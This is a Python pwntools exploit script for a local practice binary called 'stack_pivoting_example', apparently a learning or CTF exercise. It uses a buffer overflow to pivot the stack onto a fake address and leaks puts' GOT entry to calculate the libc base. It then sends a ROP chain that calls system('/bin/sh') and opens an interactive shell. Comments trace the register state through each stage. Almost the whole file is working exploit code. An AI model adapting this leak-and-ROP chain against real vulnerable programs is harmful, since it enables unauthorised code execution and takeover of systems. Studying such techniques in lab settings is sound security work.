import sys
import pwn
import struct

sys.path.append('../../MyTools')
import gadgets_info
import conversion

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './stack_pivoting_example',
	'addr_len': 0x8,
	'bufvar2stack': 0x30,
	'libc_info': '',
	'libc_base': 0x0,
	'fake_stack': 0x404a00,
	'call_read': 0x401155,
	'call_puts': 0x401149,
	'leave_ret': 0x40116c,
	'puts_got': 0x404000,
	'pop_rdi_ret': 0x0,
	'pop_rdi_len': 0x1,
	'ret_offset': 0x0,
	'bin_sh_str': 0x0,
}

'''
stage one -> set rbp to [fake address] and goto read address
	| buffer  | caller rbp         | callee return         |
	| padding | fake stack address | read function address |
	after stage one: rbp = fake stack address ; enter [read] again

stage two -> set leak info and goto puts && read address
	| buffer             | caller rbp            | callee return     |
	| padding ; puts_got | fake stack address    | call puts address |
	read:	| rbp - 0x30 | rbp - 0x8 |
			| padding    | puts_got  | 
	leave:	rsp = fake stack address + 0x8
	ret:	rbp = fake stack address
			rsp = fake stack address + 0x10
			rip = call puts address
	puts:	rdi = *(rbp-0x8) = puts_got -> leak address
	after puts, will read again (rbp-0x30)
stage three ->
	read:	| rbp - 0x30                     | caller rbp               | callee return |
			| fake stack address ; rop chain | fake stack address -0x30 | leave && ret  |
	function ->
		leave:	rsp = fake stack address - 0x10 + 0x8
		ret:	rbp = fake stack address - 0x30
				rsp = fake stack address - 0x10 + 0x10
				rip = callee return
	callee return ->
		leave:	rsp = fake stack address - 0x30 + 0x8
		ret:	rbp = fake stack address
				rsp = fake stack address - 0x30 + 0x10
				rip = rop chain
		rop chain: get shell
'''

pwn.context.binary = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = pwn.ELF(target_info['exec_path']).libc
conn = pwn.process([target_info['exec_path']])

target_info['bin_sh_str'] = target_info['libc_info'].search(b'/bin/sh').__next__()

print('[--] tips: may need update new offset')
target_info['pop_rdi_ret'] = gadgets_info.linux_adm64_gadgets['pop_rdi_ret_offset']
target_info['ret_offset'] = target_info['pop_rdi_ret'] + target_info['pop_rdi_len']

pwn.pause()

# stage 1
payload2pivoting = b'A' * target_info['bufvar2stack']
payload2pivoting += pwn.p64(target_info['fake_stack'])
payload2pivoting += pwn.p64(target_info['call_read'])
conn.sendafter(b'input somthing\n', payload2pivoting)

# stage 2
payload4leak_libc = b'A' * (target_info['bufvar2stack'] - target_info['addr_len'])
payload4leak_libc += pwn.p64(target_info['puts_got'])
payload4leak_libc += pwn.p64(target_info['fake_stack'])
payload4leak_libc += pwn.p64(target_info['call_puts'])
conn.send(payload4leak_libc)

leak4addr = conn.recv()
puts_got_addr = conversion.bytes2int(leak4addr[:-1])
print('[++] reveive: puts got address = {0}'.format(hex(puts_got_addr)))
target_info['libc_base'] = puts_got_addr - target_info['libc_info'].sym['puts']
print('[**] libc base address: {0}'.format(hex(target_info['libc_base'])))

# stage 3
payload4rop = pwn.p64(target_info['fake_stack'])
payload4rop += pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret'])
payload4rop += pwn.p64(target_info['libc_base'] + target_info['bin_sh_str'])
payload4rop += pwn.p64(target_info['libc_base'] + target_info['ret_offset'])
payload4rop += pwn.p64(target_info['libc_base'] + target_info['libc_info'].sym['system'])
payload4rop += pwn.p64(target_info['libc_base'] + target_info['libc_info'].sym['exit'])
payload4rop += pwn.p64(target_info['fake_stack'] - 0x30)
payload4rop += pwn.p64(target_info['leave_ret'])
conn.send(payload4rop)

conn.interactive()
